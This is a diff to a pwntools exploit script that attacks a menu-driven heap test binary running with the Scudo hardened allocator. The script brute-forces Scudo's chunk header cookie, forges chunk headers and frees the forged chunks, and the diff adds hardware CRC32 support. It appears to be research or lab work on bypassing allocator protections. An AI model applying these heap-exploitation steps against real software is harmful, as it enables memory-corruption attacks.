@@ -6,11 +6,11 @@ from scudocookie import bruteforce, calc_checksum
 elf = context.binary = ELF("malloc-menu-linux/malloc-menu-linux")
 
 gs = '''
-source ./malloc-menu-linux/scudo-69d4e5ae7b97.py
+source ./malloc-menu-linux/scudo-19e6d541889f.py
 continue
 '''
 
-SCUDO_LIB = os.path.realpath("malloc-menu-linux/libscudo-linux.so") 
+SCUDO_LIB = os.path.realpath("malloc-menu-linux/libscudo-linux-latest.so") 
 env = {"LD_PRELOAD": SCUDO_LIB}
 
 if args.NOSCUDO:
@@ -39,40 +39,41 @@ io = start()
 
 # The malloc() function chooses option 1 and then 3 from the menu.
 # Its arguments are "size" and "data".
-ind1, add1 = malloc(io, 24, b"Y"*24)
-ind2, add2 = malloc(io, 24, b"X"*24)
+ind1, add1 = malloc(io, 24)
+ind2, add2 = malloc(io, 24)
 
 info(f"address 1: {hex(add1)} address 2: {hex(add2)}")
 write(io, add1, b"X"*12)
 write(io, add2, b"Y"*12)
 
-scudo_base = get_libscudo_base(io, SCUDO_LIB)
+#scudo_base = get_libscudo_base(io, SCUDO_LIB)
+hardware_crc32 = True
 
-info(f"lib-scudo base: {hex(scudo_base)}")
+#info(f"lib-scudo base: {hex(scudo_base)}")
 
-cookie = bruteforce_cookie(io, add2)
+cookie = bruteforce_cookie(io, add2, hardware_crc32)
 info(f"bruteforced cookie: {hex(cookie)}")
 
 # mess with the chunk header at add2
 
 new_header = 0x8100
 new_header = create_header(0, 8, 1)
-forged_header = forge_header(add2, cookie, new_header)
+forged_header = forge_header(add2, cookie, new_header, hardware_crc32)
 
 info("writing!!!!")
 
-
+input("continue")
 
 
 largechunk_start = add2-0x40
 
 exploit_perclass_header = create_header(20, 18, 1)
 
-write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header))
+write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header, hardware_crc32))
 
 free(io, largechunk_start+0x10)
 
-write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header))
+write(io, largechunk_start, forge_header(largechunk_start+0x10, cookie, exploit_perclass_header, hardware_crc32))
 
 free(io, largechunk_start+0x10)
 
